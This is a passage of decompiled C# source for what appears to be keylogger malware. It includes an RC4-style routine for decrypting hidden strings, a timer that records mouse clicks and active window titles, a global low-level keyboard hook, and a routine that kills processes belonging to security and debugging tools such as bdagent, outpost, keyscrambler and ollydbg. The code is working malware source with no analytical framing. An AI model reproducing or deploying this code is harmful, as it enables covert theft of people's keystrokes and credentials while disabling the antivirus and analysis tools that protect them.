      int length = esendx666word.Length;
      int location1 = 0;
      while (location1 <= (int) byte.MaxValue)
      {
        char String = esendx666word.Substring(location1 % length, 1).ToCharArray()[0];
        numArray2[location1] = Strings.Asc(String);
        numArray1[location1] = location1;
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      int index3 = 0;
      int location2 = 0;
      while (location2 <= (int) byte.MaxValue)
      {
        index3 = checked (index3 + numArray1[location2] + numArray2[location2]) % 256;
        int num = numArray1[location2];
        numArray1[location2] = numArray1[index3];
        numArray1[index3] = num;
        Math.Max(Interlocked.Increment(ref location2), checked (location2 - 1));
      }
      location1 = 1;
      while (location1 <= message.Length)
      {
        index1 = checked (index1 + 1) % 256;
        index2 = checked (index2 + numArray1[index1]) % 256;
        int num1 = numArray1[index1];
        numArray1[index1] = numArray1[index2];
        numArray1[index2] = num1;
        int num2 = numArray1[checked (numArray1[index1] + numArray1[index2]) % 256];
        int CharCode = Strings.Asc(message.Substring(checked (location1 - 1), 1).ToCharArray()[0]) ^ num2;
        stringBuilder.Append(Strings.Chr(CharCode));
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      string str = stringBuilder.ToString();
      stringBuilder.Length = 0;
      return str;
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      if (Form1.GetAsyncKeyState(2L) == -32767)
      {
        this.innerz666.Text += "[RB]";
        if (Operators.CompareString(this.activewindow, this.GetActiveWindowTitle(), false) != 0)
        {
          this.activewindow = this.GetActiveWindowTitle();
          this.innerz666.Text = this.innerz666.Text + "\r\n\r\n" + this.activewindow + "\r\n\r\n\r\n";
        }
      }
      if (Form1.GetAsyncKeyState(1L) != -32767)
        return;
      this.innerz666.Text += "[LB]";
      if (Operators.CompareString(this.activewindow, this.GetActiveWindowTitle(), false) == 0)
        return;
      this.activewindow = this.GetActiveWindowTitle();
      this.innerz666.Text = this.innerz666.Text + "\r\n\r\n" + this.activewindow + "\r\n\r\n\r\n";
    }

    private void Timer3_Tick(object sender, EventArgs e)
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(this.check9, "Yes", false) == 0 && Operators.CompareString(Strings.UCase(processes[index].ProcessName), Strings.UCase("sample"), false) == 0)
          processes[index].Kill();
        if (Operators.CompareString(this.check10, "Yes", false) == 0 && Operators.CompareString(Strings.UCase(processes[index].ProcessName), Strings.UCase("outpost"), false) == 0)
          processes[index].Kill();
        if (Operators.CompareString(this.check11, "Yes", false) == 0 && Operators.CompareString(Strings.UCase(processes[index].ProcessName), Strings.UCase("npfmsg"), false) == 0)
          processes[index].Kill();
        if (Operators.CompareString(this.check12, "Yes", false) == 0 && Operators.CompareString(Strings.UCase(processes[index].ProcessName), Strings.UCase("bdagent"), false) == 0)
          processes[index].Kill();
        if (Operators.CompareString(this.check18, "Yes", false) == 0 && Operators.CompareString(Strings.LCase(processes[index].ProcessName), Strings.LCase("keyscrambler"), false) == 0)
          processes[index].Kill();
        if (Operators.CompareString(this.check21, "Yes", false) == 0 && Operators.CompareString(Strings.LCase(processes[index].ProcessName), Strings.LCase("ollydbg"), false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public class KeyboardHook
    {
      private const int HC_ACTION = 0;
      private const int WH_KEYBOARD_LL = 13;
      private const int WM_KEYDOWN = 256;
      private const int WM_KEYUP = 257;
      private const int WM_SYSKEYDOWN = 260;
      private const int WM_SYSKEYUP = 261;
      private static int KeyHook;
      private static Form1.KeyboardHook.KeyboardProcDelegate KeyHookDelegate;

      [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int SetWindowsHookEx(
        int idHook,
        Form1.KeyboardHook.KeyboardProcDelegate lpfn,
        int hmod,
        int dwThreadId);

      [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int CallNextHookEx(
        int hHook,
        int nCode,
        int wParam,
        Form1.KeyboardHook.KBDLLHOOKSTRUCT lParam);

      [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int UnhookWindowsHookEx(int hHook);

      public static event Form1.KeyboardHook.KeyDownEventHandler KeyDown;

      public static event Form1.KeyboardHook.KeyUpEventHandler KeyUp;

      public KeyboardHook()
      {
        Form1.KeyboardHook.KeyHookDelegate = new Form1.KeyboardHook.KeyboardProcDelegate(Form1.KeyboardHook.KeyboardProc);
        Form1.KeyboardHook.KeyHook = Form1.KeyboardHook.SetWindowsHookEx(13, Form1.KeyboardHook.KeyHookDelegate, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
      }

      private static int KeyboardProc(
        int nCode,
        int wParam,
        ref Form1.KeyboardHook.KBDLLHOOKSTRUCT lParam)
      {
        if (nCode == 0)
        {
          switch (wParam)
          {
            case 256:
            case 260:
              Form1.KeyboardHook.KeyDownEventHandler keyDownEvent = Form1.KeyboardHook.KeyDownEvent;
              if (keyDownEvent != null)
              {
                keyDownEvent((Keys) lParam.vkCode);
                break;
              }
              break;
            case 257:
            case 261:
              Form1.KeyboardHook.KeyUpEventHandler keyUpEvent = Form1.KeyboardHook.KeyUpEvent;
              if (keyUpEvent != null)
              {
                keyUpEvent((Keys) lParam.vkCode);
                break;
              }
              break;
          }
        }
        return Form1.KeyboardHook.CallNextHookEx(Form1.KeyboardHook.KeyHook, nCode, wParam, lParam);
      }

      ~KeyboardHook()
      {
        Form1.KeyboardHook.UnhookWindowsHookEx(Form1.KeyboardHook.KeyHook);
        // ISSUE: explicit finalizer call
        base.Finalize();
      }

      private struct KBDLLHOOKSTRUCT
      {
        public int vkCode;
        public int scancode;
        public int flags;
        public int time;
        public int dwExtraInfo;
      }

      private delegate int KeyboardProcDelegate(
        int nCode,
        int wParam,
        ref Form1.KeyboardHook.KBDLLHOOKSTRUCT lParam);

      public delegate void KeyDownEventHandler(Keys Key);

      public delegate void KeyUpEventHandler(Keys Key);
    }
  }
}
